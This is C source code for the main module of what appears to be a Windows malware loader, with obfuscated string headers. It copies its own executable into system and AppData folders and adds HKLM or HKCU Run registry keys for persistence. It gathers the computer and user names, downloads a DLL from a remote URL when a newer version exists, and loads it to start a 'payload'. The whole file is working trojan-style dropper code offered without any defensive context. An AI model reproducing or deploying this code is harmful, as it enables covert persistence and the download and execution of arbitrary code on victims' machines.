#include <windows.h>
#include <stdio.h>
#include "main.h"
#include "shared/include/maindef.h"
#include "shared/include/osversion.h"
#include "shared/include/ofuscstring.h"
#include "shared/include/loadDll.h"
#include "shared/include/structdll.h"
#include "shared/include/CHTTPClass.h"

typedef int (WINAPI *fnGETVERSION)(void);
typedef void (WINAPI *fnSTARTPAYLOAD)(PARAMETERS *pParam);
typedef void (WINAPI *fnSTOPPAYLOAD)(void);

/*  Declare Windows procedure  */
LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);

bool install(API *pApi, PARAMETERS *pParam) {
    char *svCommandLine; char *svCommandLine2;char svTargetName1[MAX_PATH];
    char svTargetName2[MAX_PATH];char svRegPath[MAX_PATH];char svTargetName3[MAX_PATH];
    char stCommandLine[MAX_PATH];
    char *svRunRegKey;char *svTargetName; bool bInstalled=false;
    DWORD dwLenght=512; DWORD lpType=REG_SZ; HKEY key;int i;
    
    _sleep(5000);


    sprintf(svTargetName3,"%s%s",pParam->sTmpDirectory,STR_MAIN_PROCESSNAME);
    wsprintf(svTargetName1,"%s\\%s",pParam->sSystemDirectory,STR_MAIN_PROCESSNAME);
    wsprintf(svTargetName2,"%s\\Microsoft\\%s",pParam->sMyDocuments,STR_MAIN_PROCESSNAME);

    strcpy(stCommandLine,GetCommandLine());
    svCommandLine=stCommandLine;
    if (*svCommandLine=='"') {
      svCommandLine++;
      *(svCommandLine+strlen(svCommandLine)-2)=0;                         
    }
    
    svCommandLine2=GetCommandLine();
    while (*svCommandLine2!='\0')
    {
          if (*svCommandLine2==' ' && *(svCommandLine-4)=='.')
             *svCommandLine2=0;
          svCommandLine2++;
    }
    
    if(bIsWinNT) {
			svRunRegKey=STR_INSTALL_KEY1;
	} else {
			svRunRegKey=STR_INSTALL_KEY2;
	}
	
    if((GetFileAttributes(svTargetName1)!=0xFFFFFFFF) || (GetFileAttributes(svTargetName2)!=0xFFFFFFFF)){
        dwLenght=MAX_PATH;
        if (GetFileAttributes(svTargetName1)!=0xFFFFFFFF)
           strcpy(pParam->sInstalledRep,svTargetName1);
        else   
           strcpy(pParam->sInstalledRep,svTargetName2);
        
        
        if(pApi->pRegOpenKeyEx(HKEY_LOCAL_MACHINE,svRunRegKey,0,KEY_READ,&key)==ERROR_SUCCESS)
            if (pApi->pRegQueryValueEx(key,STR_MAIN_KEYNAME,0,&lpType ,(BYTE *)svRegPath,&dwLenght)==ERROR_SUCCESS) {
               strcpy(pParam->sInstalledKey,svRunRegKey);
               return true;
            }

        dwLenght=MAX_PATH;
        if (pApi->pRegOpenKey(HKEY_CURRENT_USER,STR_INSTALL_KEY1,&key)==ERROR_SUCCESS)
          if (pApi->pRegQueryValueEx(key,STR_MAIN_KEYNAME,NULL,NULL,(BYTE *)svRegPath,&dwLenght)==ERROR_SUCCESS) {
                  strcpy(pParam->sInstalledKey,svRunRegKey);
                  return true;
          }
    }

    dwLenght=MAX_PATH;

    if((GetFileAttributes(svTargetName1)==0xFFFFFFFF) && (GetFileAttributes(svTargetName2)==0xFFFFFFFF))
    {
         if(CopyFile(svCommandLine,svTargetName1,false))
            svTargetName=svTargetName1;
         else if (CopyFile(svCommandLine,svTargetName2,false))
                  svTargetName=svTargetName2;
              else if (CopyFile(svCommandLine,svTargetName3,false))
                      svTargetName=svTargetName3;
                   else
                       svTargetName=NULL;
    } else {
    
      if (GetFileAttributes(svTargetName2)!=0xFFFFFFFF)
         svTargetName=svTargetName2;
                                                   
      if (GetFileAttributes(svTargetName1)!=0xFFFFFFFF)
         svTargetName=svTargetName1;                                               
    }
	if(pApi->pRegCreateKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
             if(pApi->pRegOpenKey(HKEY_LOCAL_MACHINE,svRunRegKey,&key)==ERROR_SUCCESS) {
				  if(pApi->pRegSetValueEx(key,STR_MAIN_KEYNAME,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
                       strcpy(pParam->sInstalledRep,svTargetName);
                       strcpy(pParam->sInstalledKey,svRunRegKey);
                       bInstalled=true;
				  }
				  pApi->pRegCloseKey(key);
			  }
    }
    if (!bInstalled) {
         if(pApi->pRegCreateKey(HKEY_CURRENT_USER,STR_INSTALL_KEY1,&key)==ERROR_SUCCESS) {
             if(pApi->pRegOpenKey(HKEY_CURRENT_USER,STR_INSTALL_KEY1,&key)==ERROR_SUCCESS) {
				  if(pApi->pRegSetValueEx(key,STR_MAIN_KEYNAME,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
					  bInstalled=true ;
					  strcpy(pParam->sInstalledRep,svTargetName);
                      strcpy(pParam->sInstalledKey,STR_INSTALL_KEY1);
				  }
			  }                                                                                                               
         }
    } 
    return bInstalled;
}


void initializeVars(PARAMETERS *pParam,API *pApi) {
   DWORD dwLenght;
   dwLenght=512;
   GetComputerName(pParam->sComputerName,&dwLenght); 
   dwLenght=512;
   GetTempPath(dwLenght,pParam->sTmpDirectory); 
   GetSystemDirectory(pParam->sSystemDirectory,sizeof(pParam->sSystemDirectory));
   pApi->pGetUserName(pParam->sUserName,&dwLenght);
   pApi->pSHGetSpecialFolderPath(0,pParam->sMyDocuments,CSIDL_APPDATA ,0);     
}

int getOnlineVersion(API *pApi) {
    char *pC;
    DWORD dwDataLenght;
    
    CHTTPClass *oHTTPClient;
    oHTTPClient=new CHTTPClass(pApi); 
    oHTTPClient->SetURL(STR_MAIN_URL_INITVERSION); 
    oHTTPClient->Connect();
    oHTTPClient->SendRequest();
    pC=oHTTPClient->ReadHTTPHeader();
    if (oHTTPClient->HTTPErrorCode(pC)==_HTTP_OK) {
       pC=oHTTPClient->ReadHTTPData(&dwDataLenght);                                   
    }
    pC[4]=0;
    return atoi(pC);
}

int downloadOnlineVersion(API *pApi) {
    DWORD dwDataLenght;
    char *pC;
    FILE *pFile;
    CHTTPClass *oHTTPClient;

    
    oHTTPClient=new CHTTPClass(pApi);
    oHTTPClient->SetURL(STR_MAIN_URL_DOWNLOADVERSION);
    oHTTPClient->Connect();
    oHTTPClient->SendRequest();
    pC=oHTTPClient->ReadHTTPHeader();
     
    if (oHTTPClient->HTTPErrorCode(pC)==_HTTP_OK) {
       pFile=fopen(STR_MAIN_DLLNAME,"wb");
       if (!pFile) {
          delete(oHTTPClient);
          return _ERROR_EXE_FILENOTFOUND;
       }
       pC="";
       while (pC){
          pC=oHTTPClient->ReadHTTPData(&dwDataLenght);
          if (pC)
             if (fwrite(pC,sizeof(char),dwDataLenght,pFile)!=dwDataLenght)
             {
                fclose(pFile);
                delete(oHTTPClient);
                return _ERROR_CMD_FILENOTCOMPLETE;                                                              
             }
       }
       fclose(pFile); 
     }
     delete(oHTTPClient);
     return 0;
}

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)
{
    MSG messages;            /* Here messages to the application are saved */
    fnGETVERSION pGetVersion;
    fnSTARTPAYLOAD pStartPayLoad;
    fnSTOPPAYLOAD pStopPayLoad;
    HINSTANCE pW32Core;
    DLLHANDLER pDllHandler;
    bool bToDownload=true;DWORD dwDataLenght; 
    PARAMETERS oParam;
    int version;
    API pApi;char *pC;
    
    StringPlainText();
    loadLibraryWinInet(&pDllHandler,&pApi);
    loadLibraryShell32(&pDllHandler,&pApi);
    loadLibraryAdvAPI32(&pDllHandler,&pApi);
    GetOSVersion(oParam.sWindowsVersion);
    initializeVars(&oParam,&pApi);
    install(&pApi,&oParam);
    
    pW32Core=LoadLibrary (STR_MAIN_DLLNAME);
    if (pW32Core) {
        pGetVersion = (fnGETVERSION)GetProcAddress(pW32Core, "getVersion");
        if (pGetVersion) 
           if (!(getOnlineVersion(&pApi)>pGetVersion()))
              bToDownload=false;
    }
    
    if (bToDownload) {
       FreeLibrary(pW32Core);
       MessageBox( HWND_DESKTOP, "Have to be dowloaded","Have to be downloaded", MB_OK );
       downloadOnlineVersion(&pApi);
       pW32Core=LoadLibrary (STR_MAIN_DLLNAME);
    }
    
    pStartPayLoad = (fnSTARTPAYLOAD)GetProcAddress(pW32Core, "startPayLoad");
    if (!pStartPayLoad) {   
       return 0;
    }
    pStopPayLoad = (fnSTOPPAYLOAD)GetProcAddress(pW32Core, "stopPayLoad");
    pStartPayLoad(&oParam); 

    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    pStopPayLoad();
    FreeLibrary(pW32Core);
    freeLibraries(&pDllHandler);
  
    return messages.wParam;
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  /* handle the messages */
    {
        case WM_DESTROY:
            PostQuitMessage (0);       /* send a WM_QUIT to the message queue */
            break;
        default:                      /* for messages that we don't deal with */
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}
